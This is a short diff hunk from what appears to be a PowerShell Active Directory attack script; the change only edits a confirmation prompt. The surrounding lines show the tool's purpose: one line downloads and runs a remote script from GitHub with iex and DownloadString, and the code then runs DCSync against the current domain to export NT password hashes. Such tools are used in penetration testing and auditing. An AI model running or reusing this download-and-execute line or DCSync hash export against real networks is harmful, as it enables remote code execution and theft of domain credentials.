@@ -25,7 +25,7 @@ iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/
 $domain = get-netdomain | Select-Object -property Name | foreach { $_.Name}
 Write-Host "[INFO] DCSync will be executed for the domain: $domain" -ForegroundColor Red
 
-$confirmation = Read-Host "Is the domain correct to execute DCSync on? (y/n):"
+$confirmation = Read-Host "Is the domain correct to execute DCSync on? (y/n)"
 if ($confirmation -eq 'y') {
     # execute DCSync to export NT-Hashes
     Write-Host "[!] Exporting NT-Hashes via DCSync" -ForegroundColor Yellow
